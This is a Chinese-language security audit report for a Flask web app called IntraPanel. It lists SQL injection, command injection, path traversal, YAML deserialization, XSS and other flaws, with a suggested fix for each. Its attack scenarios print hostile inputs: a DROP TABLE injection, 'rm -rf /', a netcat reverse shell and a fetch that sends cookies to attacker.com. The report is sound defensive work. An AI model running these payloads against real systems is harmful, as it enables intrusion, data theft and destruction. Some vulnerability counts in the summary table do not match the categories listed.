# 安全漏洞分析报告

## 项目概述
- **项目名称**: IntraPanel
- **分析日期**: 2026年4月25日
- **技术栈**: Flask (Python Web 框架), SQLite, Jinja2 模板

---

## 高危漏洞

### 1. SQL 注入漏洞 (Critical)
**位置**: `db.py`

#### 漏洞详情
- **`find_user` 函数** (第28行): 使用 `%` 格式化字符串拼接 SQL 查询
  ```python
  query = "SELECT * FROM users WHERE username = '%s'" % username
  ```

- **`find_user_by_email` 函数** (第36行): 使用 f-string 拼接 SQL 查询
  ```python
  query = f"SELECT * FROM users WHERE email = '{email}'"
  ```

- **`create_user` 函数** (第44行): 使用 `.format()` 拼接 SQL
  ```python
  query = "INSERT INTO users (username, pw_hash, email) VALUES ('{}', '{}', '{}')".format(...)
  ```

#### 攻击场景
攻击者可以通过在用户名或邮箱输入框中注入 SQL 代码：
- 输入: `' OR '1'='1` 可绕过认证获取所有用户
- 输入: `'; DROP TABLE users; --` 可删除数据表

#### 修复建议
使用参数化查询：
```python
cur.execute("SELECT * FROM users WHERE username = ?", (username,))
```

---

### 2. 命令注入漏洞 (Critical)
**位置**: `app.py`

#### 漏洞详情
- **`diag_ping` 函数** (第134行): 直接将用户输入拼接到 shell 命令
  ```python
  output = subprocess.check_output("ping -c 1 " + host, shell=True, ...)
  ```

- **`files_download` 函数** (第108行): 使用 `shell=True` 并拼接用户输入
  ```python
  result = subprocess.call(["sh", "-c", "cat " + filepath], shell=True)
  ```

#### 攻击场景
- 输入: `8.8.8.8; cat /etc/passwd` 可读取系统文件
- 输入: `; rm -rf /` 可执行破坏性命令
- 输入: `; nc attacker.com 4444 -e /bin/bash` 可建立反向 shell

#### 修复建议
```python
# 使用列表形式传递参数，不使用 shell=True
subprocess.check_output(["ping", "-c", "1", host])
```

---

### 3. 路径遍历漏洞 (High)
**位置**: `app.py` - `files_download` 和 `files_upload` 函数

#### 漏洞详情
- **第105-109行**: 未验证文件名，直接使用用户输入
  ```python
  filename = request.args.get("file", "")
  filepath = os.path.join("uploads", filename)
  ```

- **第119行**: 上传文件使用客户端提供的文件名
  ```python
  save_path = os.path.join("uploads", f.filename)
  ```

#### 攻击场景
- 下载: `file=../../etc/passwd` 可读取任意系统文件
- 上传: 文件名设为 `../../app.py` 可覆盖应用代码

#### 修复建议
```python
import re
from werkzeug.utils import secure_filename

# 验证文件名
filename = secure_filename(filename)
filepath = os.path.join("uploads", filename)

# 确保路径在目标目录内
if not os.path.commonpath([filepath, os.path.abspath("uploads")]) == os.path.abspath("uploads"):
    raise Exception("Invalid path")
```

---

### 4. 硬编码密钥和凭证 (High)
**位置**: `app.py`, `db.py`

#### 漏洞详情
| 位置 | 代码 | 风险 |
|------|------|------|
| app.py:14 | `app.secret_key = "supersecretkey123"` | Session 可被伪造 |
| app.py:17 | `INTERNAL_API_KEY = "sk-internal-abc123xyz"` | API 密钥泄露 |
| app.py:18 | `ADMIN_PASSWORD = "admin"` | 管理员密码硬编码 |
| db.py:4 | `DB_PASSWORD = "admin123"` | 数据库密码泄露 |

#### 攻击场景
- 攻击者获取代码即可获知所有敏感凭证
- Session 密钥泄露可导致会话劫持攻击

#### 修复建议
使用环境变量：
```python
import os
app.secret_key = os.environ.get('SECRET_KEY')
```

---

### 5. YAML 反序列化漏洞 (High)
**位置**: `app.py` - `load_config` 函数 (第23-27行)

#### 漏洞详情
```python
return yaml.load(f)  # 未指定 Loader
```

`yaml.load()` 默认使用不安全的 `Loader`，可执行任意 Python 代码。

#### 攻击场景
攻击者上传恶意 YAML 文件：
```yaml
!!python/object/apply:os.system ["rm -rf /"]
```

#### 修复建议
```python
return yaml.safe_load(f)  # 或 yaml.load(f, Loader=yaml.SafeLoader)
```

---

### 6. 跨站脚本攻击 (XSS) (High)
**位置**: `templates/users.html`, `templates/diag.html`

#### 漏洞详情
- **users.html:12**: 搜索参数直接输出到页面
  ```html
  <input type="text" name="q" placeholder="Search by username" value="{{ q }}">
  ```

- **users.html:22**: 搜索结果显示时未转义
  ```html
  <p>No user found for <em>{{ q }}</em>.</p>
  ```

- **diag.html**: 命令输出直接显示
  ```html
  <pre>{{ output }}</pre>
  ```

#### 攻击场景
- 输入: `<script>alert(document.cookie)</script>` 可窃取用户 cookie
- 输入: `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`

#### 修复建议
确保开启 Jinja2 自动转义（Flask 默认开启），或手动使用 `|e` 过滤器：
```html
<input type="text" value="{{ q | e }}">
```

---

## 中危漏洞

### 7. 弱密码哈希 (Medium)
**位置**: `utils.py` - `hash_password` 函数

#### 漏洞详情
```python
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
```

使用 MD5 哈希密码，容易被彩虹表攻击和暴力破解。

#### 修复建议
使用 `werkzeug.security` 或 `bcrypt`：
```python
from werkzeug.security import generate_password_hash, check_password_hash

pw_hash = generate_password_hash(password, method='pbkdf2:sha256')
```

---

### 8. 不安全的随机数生成 (Medium)
**位置**: `utils.py` - `generate_token` 函数

#### 漏洞详情
```python
def generate_token(length=32):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))
```

使用 `random` 模块生成安全令牌，不适用于加密场景。

#### 修复建议
```python
import secrets
def generate_token(length=32):
    return secrets.token_urlsafe(length)
```

---

### 9. 不安全的 SSH 配置 (Medium)
**位置**: `app.py` - `diag_ssh` 函数 (第144-145行)

#### 漏洞详情
```python
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
```

自动接受未知主机密钥，容易受到中间人攻击。

#### 修复建议
```python
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.RejectPolicy())
```

---

### 10. CSRF 保护缺失 (Medium)
**位置**: 所有表单提交路由

#### 漏洞详情
所有表单（登录、注册、上传、诊断工具）都没有 CSRF 令牌保护。

#### 攻击场景
攻击者可构造恶意页面诱导已登录用户执行非预期操作。

#### 修复建议
使用 Flask-WTF 扩展：
```python
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```

---

## 低危漏洞

### 11. 依赖包版本过旧 (Low)
**位置**: `requirements.txt`

#### 漏洞详情
| 包 | 当前版本 | 已知漏洞 |
|----|---------|---------|
| Flask | 0.12.4 | CVE-2018-1000656, CVE-2019-1010083 |
| Werkzeug | 0.15.5 | CVE-2019-14806 |
| Jinja2 | 2.11.3 | CVE-2020-28493 |
| requests | 2.19.1 | CVE-2018-18074 |
| PyYAML | 5.1 | CVE-2020-14343 |
| Pillow | 8.0.0 | CVE-2021-27921 |
| paramiko | 2.4.1 | CVE-2018-1000805 |

#### 修复建议
更新到最新版本：
```
Flask>=2.3.0
Werkzeug>=2.3.0
Jinja2>=3.1.0
requests>=2.31.0
PyYAML>=6.0
Pillow>=10.0.0
paramiko>=3.0.0
```

---

### 12. 调试模式开启 (Low)
**位置**: `app.py` - 最后一行

#### 漏洞详情
```python
app.run(debug=True, host="0.0.0.0", port=5000)
```

调试模式开启会暴露详细的错误信息和交互式调试器。

#### 修复建议
```python
app.run(debug=False, host="0.0.0.0", port=5000)
```

---

### 13. 敏感操作缺少权限检查 (Low)
**位置**: `app.py`

#### 漏洞详情
- `/users` 路由：普通用户可以查询所有用户信息
- `/diag` 路由：普通用户可以执行系统诊断命令
- `/files/download` 和 `/files/upload`：没有文件所有权验证

#### 修复建议
添加管理员权限检查装饰器：
```python
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('is_admin'):
            return jsonify({'error': 'Admin required'}), 403
        return f(*args, **kwargs)
    return decorated
```

---

### 14. 文件上传缺少类型验证 (Low)
**位置**: `app.py` - `files_upload` 函数

#### 漏洞详情
上传文件没有验证文件类型，可能上传恶意脚本。

#### 修复建议
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

---

## 总结

| 等级 | 数量 | 漏洞类型 |
|------|------|---------|
| Critical | 2 | SQL 注入、命令注入 |
| High | 4 | 路径遍历、硬编码凭证、YAML 反序列化、XSS |
| Medium | 3 | 弱哈希、不安全随机数、不安全 SSH、CSRF |
| Low | 5 | 依赖漏洞、调试模式、权限检查、文件上传 |

**建议优先修复**: SQL 注入、命令注入、路径遍历、硬编码凭证
